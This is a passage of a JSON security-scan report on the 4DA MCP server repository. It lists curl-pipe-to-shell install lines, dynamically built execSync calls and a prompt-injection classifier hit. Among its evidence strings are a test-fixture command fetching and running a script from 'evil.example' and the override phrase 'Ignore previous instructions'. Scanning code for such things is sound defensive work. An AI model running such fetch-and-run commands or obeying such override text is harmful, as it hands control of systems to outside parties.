@@ -1,0 +1,855 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "4DA-Systems/4DA",
+    "version": "0eb0be458876c7ef0da03e7beb88186966144cbe",
+    "download": "https://codeload.github.com/4DA-Systems/4DA/tar.gz/0eb0be458876c7ef0da03e7beb88186966144cbe"
+  },
+  "archive_sha256": "3b9db149abf23b0992220040d57376dab782bb13159465e376de45fcb61f70cd",
+  "findings": [
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/AGENTS.md",
+      "line": 1,
+      "evidence": "p=0.98 # 4DA — Codex Instructions",
+      "file_sha256": "ab39913d0062dec35679213228d5e2d6608cc27aa5565184abe7abf2cc1015a8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-F-TYPOSQUAT",
+      "summary": "Name is one or two characters off popular package `playwright-mcp`. Check you meant this one.",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/.mcp.json",
+      "line": null,
+      "evidence": "npm:@playwright/mcp vs playwright-mcp",
+      "file_sha256": "a556a96f71369ac78909dd90cb6e05bea31b64b09eb0a7f0e817256c048469a4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/LINUX.md",
+      "line": 116,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "216a9d5e7a8081af83017a7f1693627c0fbcdf28af4841a27728fb1c587bbf5e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/de/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "d3a32859c10eaa8b3d01a65196567b9aae48ed46b51d863a2847a06d97660ee9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/de/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "26f79e01c1739bbcb415df9d33d27b00e711c3aef1aa480700cc66c72319f89d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/it/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "f5cd87a54817202a045c6f66ceafdbae95e39dea74c685b09684fb5f6ae8d5ba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/it/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "3dae34eea2ac56066ca5cd53bc75c23181ceba2022258f99c36f2b03d8075af4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/hi/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "33ce68abeec5d6f552b50b92aa141ae9d10b0a8f8e9a194ef2e9fe69e0659d12"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/hi/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "c68c1b3b2dc42f218f637a711ffcac269dbab4c28629009a7a123e3d617fcdc7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/ru/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "d40fb4c55f774ea28079de1e407e29a3acb9b7f314eb67d6f3824c4e204b32de"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/ru/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "bbde59948577433dcd25158f39c692f623dd12ea5863d55281b17120b7de0de1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/fr/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "fb0ad946660c1c6aa5fb55d6d78db15b7ab745856fb37315aad331817f010b3a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/fr/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "57c82b0be8c9b5da63ac8984eae72a4d36d9aa282ef9e1e6526babf32b79caa1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/tr/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "cccdea07f5630cc6e0887ec8033bf19764c9fb086c81f65a59e9decafe68d473"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/tr/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "3c04ca8d86d607ff7cc563314ef78c4c4d1440a830d22dd408f5a5c4d1603c44"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/ja/execution-playbook.md",
+      "line": 469,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "056cab92ce81f867dca022be1dc248ed99c870efadb1c7bcc11f88aed151c555"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/ja/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "4a914ccfa0158074a9e72bd153401b2703f2e3d4a8c2dc18d759288ca7ff74e2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "91fc8554e7a479729bac3058c569ff76871641c9956f7ead1665093cfeb09374"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "2e6f11f799a5f73a99e717de37ec6ae0623c330d89e18ee86780acec33b07280"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/ko/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "e35344deaa39ba367b404949305f9179e4180587a74e56c9993135fea2d09fe8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/ko/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "f122743b1be6b3b8382f93c703bfb132a42e773763abedcf5d68a5dd1e16a0cf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/ar/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "44a8c2e927039f5d7dee562bc5be902de1f47b0cc8fc8d7dc9aaec1e9c71c686"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/ar/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "a4131b7588c501f76193339fa7d28f30e6aa8969ee2b03094331b9a1f3743f1e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/pt-BR/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "8d1eacdfe72ee552c4ef71152936013a47d3306646778e5e24fb1a860f4288f3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/pt-BR/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "45d8198e7ceba22dddb40ef426dd19ec1db7b363af299e756247cc6d205d59bb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/es/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "65526856717c7b403e5a2ba2450b8cfc61e00dcb3bc4768a7294464511f849dd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/es/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "2fe41d52cbfe1c76e2d3b0f7514b38ab34674fc20c25385525f52b020654aa70"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/zh/execution-playbook.md",
+      "line": 468,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "7c19552582fa109ecb33442230c4b24bad3acc10138f82e29f187e6c2f627595"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/site/src/streets/zh/sovereign-setup.md",
+      "line": 323,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "d68e9843022dd2112ae1c2e9fd60fcad0ad7744f6a1e40ebae2ed4bf4c44d4d6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/compound-quality-check.cjs",
+      "line": 37,
+      "evidence": "execSync(`git ${cmd}`, { cwd: ROOT, stdio: 'pipe', encoding: 'utf8', timeout: 10",
+      "file_sha256": "703e5c96b19d27c1451c98c3a6d17149a69fced4e3d31bef9fe4667d0639d5ea"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/ensure-hooks.cjs",
+      "line": 18,
+      "evidence": "execSync(`git ${args}`, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] ",
+      "file_sha256": "d3d83710990b6cbfc14b0873de3ce91951073e73036d04f9078446ddd577cdfb"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/gate-jobs.test.cjs",
+      "line": 131,
+      "evidence": "curl http://evil.example/x | sh",
+      "file_sha256": "6ab28f1e07a14417bf3ac78d9c4a23c83213fb909ffe5379dc98e00b634da5d6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/validate-components.cjs",
+      "line": 44,
+      "evidence": "execSync(`node -c \"${filePath}\"`, { stdio: 'pipe' })",
+      "file_sha256": "ed86e96726b10ec82ba4b1383c89553034e9f9ff4d65f991b7a258e3215dd002"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/ops-funnel-snapshot.cjs",
+      "line": 40,
+      "evidence": "execSync(`gh api ${args}`, { encoding: \"utf8\", stdio: [\"ignore\", \"pipe\", \"pipe\"]",
+      "file_sha256": "71df4859061d7851a6a399afc2b66f14be6b2ee4ba1f759263b59d574889c053"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/i18n-sync.cjs",
+      "line": 182,
+      "evidence": "execSync(`node scripts/validate-translations.cjs ${args}`, { stdio: 'inherit', c",
+      "file_sha256": "3a991ce598e0dbda6a765f197d4afbebb10f3c886acaa3a6265256df1361f88c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/i18n-sync.cjs",
+      "line": 359,
+      "evidence": "execSync('node scripts/i18n-quality-judge.cjs ' + process.argv.slice(3).join(' '",
+      "file_sha256": "3a991ce598e0dbda6a765f197d4afbebb10f3c886acaa3a6265256df1361f88c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/kill-fourda.cjs",
+      "line": 54,
+      "evidence": "execSync(`powershell -nop -EncodedCommand ${encoded}`, { encoding: 'utf8', stdio",
+      "file_sha256": "94fddd3e74581bfc2d2f8a707e1b756129cad77e5b2722dd45fc63a42e371e69"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/kill-fourda.cjs",
+      "line": 79,
+      "evidence": "execSync(`taskkill /F /PID ${pid}`, { stdio: 'pipe' })",
+      "file_sha256": "94fddd3e74581bfc2d2f8a707e1b756129cad77e5b2722dd45fc63a42e371e69"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/kill-port.cjs",
+      "line": 180,
+      "evidence": "execSync(`netstat -ano | findstr :${port} | findstr LISTENING`, { encoding: 'utf",
+      "file_sha256": "4f88a34f43dab3eb1746e25ffe7f1be6e78939384f9eda2f0aa26697da76e0f3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/kill-port.cjs",
+      "line": 194,
+      "evidence": "execSync(`taskkill /F /PID ${pid}`, { stdio: 'pipe' })",
+      "file_sha256": "4f88a34f43dab3eb1746e25ffe7f1be6e78939384f9eda2f0aa26697da76e0f3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/kill-port.cjs",
+      "line": 202,
+      "evidence": "execSync(`lsof -ti :${port}`, { encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'",
+      "file_sha256": "4f88a34f43dab3eb1746e25ffe7f1be6e78939384f9eda2f0aa26697da76e0f3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/kill-port.cjs",
+      "line": 209,
+      "evidence": "execSync(`kill -9 ${pid}`, { stdio: 'pipe' })",
+      "file_sha256": "4f88a34f43dab3eb1746e25ffe7f1be6e78939384f9eda2f0aa26697da76e0f3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/impact-analysis.cjs",
+      "line": 537,
+      "evidence": "execSync( `git log --oneline --since=\"30 days ago\" -- \"${filePath}\"`, { cwd: ROO",
+      "file_sha256": "8c33fd20766ee597832a09d4a7060c6b3a4d69af4c890b2d45859ee9878a7149"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/impact-analysis.cjs",
+      "line": 549,
+      "evidence": "execSync( `git log --oneline --since=\"30 days ago\" -${limit || 10} -- \"${filePat",
+      "file_sha256": "8c33fd20766ee597832a09d4a7060c6b3a4d69af4c890b2d45859ee9878a7149"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/smoke-test-vite.cjs",
+      "line": 102,
+      "evidence": "execSync(`netstat -ano | findstr :${port} | findstr LISTENING`, { encoding: 'utf",
+      "file_sha256": "20a980ddeca71c72492ec9a4db8b56c63f34a231a614a1b9e618291e1e17c19e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/smoke-test-vite.cjs",
+      "line": 108,
+      "evidence": "execSync(`lsof -ti :${port}`, { encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'",
+      "file_sha256": "20a980ddeca71c72492ec9a4db8b56c63f34a231a614a1b9e618291e1e17c19e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/download-ort.cjs",
+      "line": 131,
+      "evidence": "execSync( `powershell -NoProfile -Command \"` + // Windows PowerShell 5.1 does no",
+      "file_sha256": "5c797f597291e9a4d31e9368aacd117b3500ec19366ce1174c102f305b586fe6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/download-ort.cjs",
+      "line": 143,
+      "evidence": "execSync(`unzip -o -j \"${tmpZip}\" \"*/${libName}\" -d \"${DEST_DIR}\"`, { stdio: 'pi",
+      "file_sha256": "5c797f597291e9a4d31e9368aacd117b3500ec19366ce1174c102f305b586fe6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/scripts/download-ort.cjs",
+      "line": 180,
+      "evidence": "execSync(`tar xzf \"${tgzName}\"`, { cwd: tmpDir, stdio: 'pipe' })",
+      "file_sha256": "5c797f597291e9a4d31e9368aacd117b3500ec19366ce1174c102f305b586fe6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/strategy/INTELLIGENCE-MESH.md",
+      "line": 470,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "1547ae10e84b59b225c9d796c5bd4d30066b3c14329e06c9980992be73a16fbb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/GETTING_STARTED.md",
+      "line": 22,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "file_sha256": "2a26f49c9b433f3a7f1fa77ba28c6506278e489f89d314127878cbaf60915e6d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/de/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "1b2b6fa1985b1f35ad149813620b5fc1b6f9afe2be451d07309b1a7730577d20"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/de/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "1e39acf7b5520387c8876ad3b60f0c739878a7dc614194e7df73538272a47bc5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/it/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "ccb8eba1e7c85388a6ef8e7c7f2b55912820cf9ffef49b11e562be0bc2d3d02b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/it/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "83ec0e93e367b9f65837f91940b7263c37bc26fd53181966fb43479f4bf0c655"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/hi/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "ea77d9d145d977bf1ff5e0e51e5d487593b5f5a297736147f2d68c2a37c3bf68"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/hi/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "9bc92a6bdf5ad65e1450fa82fdbf5cd8a58ea235b37f9f27200744eb05d95d71"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/ru/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "6671f8f236c75f0165ace85c76d6ada8cfea583b16a6cb839378b236081bc976"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/ru/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "6b271f9ebe509f5edcf820e00f56f709187d52a574ed27b850f5264a9a7da212"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/fr/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "c98773c8deefc95e84dd9a3446dcae6aef293b0cd260de0001aa5561cff40f1a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/fr/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "95f6c1ecfe13518457b28ec12192012677702294dd8609632b73c947279871a0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/tr/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "8a09918e03e16c952cbb23fed449a61a1a26fe837d8097d2077640133409c13f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/tr/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "c103f0b75914324280377a746358e656470d7ae0ad923b72184a9e35ee351c8d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/ja/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "8acc755959d144523f3cfbb1bf7dc9e9817ba2c60569fd1124d1a1ee0914f923"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/ja/module-e1-execution-playbook.md",
+      "line": 465,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "0380c0578cd35ae851f7866d612fba49ed47715d2a127d7d0a5859f6209ebf56"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "67be1c71e5839e9226b891a9fa7873e22c593c0c4acbf8c324d238870d1ec454"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/module-e1-execution-playbook.md",
+      "line": 464,
+      "evidence": "curl -L https://fly.io/install.sh | sh",
+      "file_sha256": "b21190915a0f98d68566917e68d501927c8e5ced80fe25743fc9640b2debec76"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "4DA-0eb0be458876c7ef0da03e7beb88186966144cbe/docs/streets/ko/module-s-sovereign-setup.md",
+      "line": 322,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
